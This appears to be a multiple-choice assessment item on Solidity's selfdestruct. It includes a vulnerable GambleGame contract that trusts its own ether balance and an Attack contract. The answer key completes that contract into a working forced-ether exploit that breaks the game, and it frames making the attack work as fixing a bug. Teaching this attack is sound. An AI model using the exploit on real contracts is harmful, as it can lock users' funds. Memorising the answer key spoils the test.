# Selfdestruct

## Item ID
2580

## Claim
1

## Claim Behavior (evidence)
https://eips.ethereum.org/EIPS/eip-6

https://solidity-by-example.org/hacks/self-destruct/

## Content Target
Selfdestruct

## Cognitive Model
Use

## Item Type
Multiple Choice 

## Stem
The following contract has a bug. Choose the option that correctly identifies and fixes the bug.

## Code Snippet (optional)
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

contract GambleGame {
    uint public targetAmount = 10 ether;
    address public winner;

    function deposit() public payable {
        require(msg.value == 1 ether);

        uint balance = address(this).balance;
        require(balance <= targetAmount, "Goodbye");

        if (balance == targetAmount) {
            winner = msg.sender;
        }
    }

    function claimReward() public {
        require(msg.sender == winner, "Not winner");

        (bool sent, ) = msg.sender.call{value: address(this).balance}("");
        require(sent, "Failed to send crypto");
    }
}

contract Attack {
    GambleGame gambleGame;

    constructor(GambleGame _gambleGame) {
        gambleGame = GambleGame(_gambleGame);
    }

    function attack() public payable {
        address payable addr = payable(address(gambleGame));
        delete(addr);
    }
}
// solidity-by-example.org: MIT License
```

## Answer Key
```solidity
delete(addr);
```

should look like: 
```solidity
selfdestruct(addr);
```

## Distractors
### 1.
```solidity
 address payable addr = payable(address(gambleGame));
```

should look like:
```solidity
 address addr = payable(address(gambleGame));
```

### 2.
```solidity
function deposit() public payable {
```

should look like:
```solidity
function deposit() private payable {
```

### 3.
```solidity
uint public targetAmount = 10 ether;
```

should look like:
```solidity
int public targetAmount = 10 ether;
```

## Common errors, misconceptions, or irrelevant information:

# Triplebyte Review

## Language Review: (TB only)

## Bias and Fairness Review: (TB only)

## Content Review: (TB only)
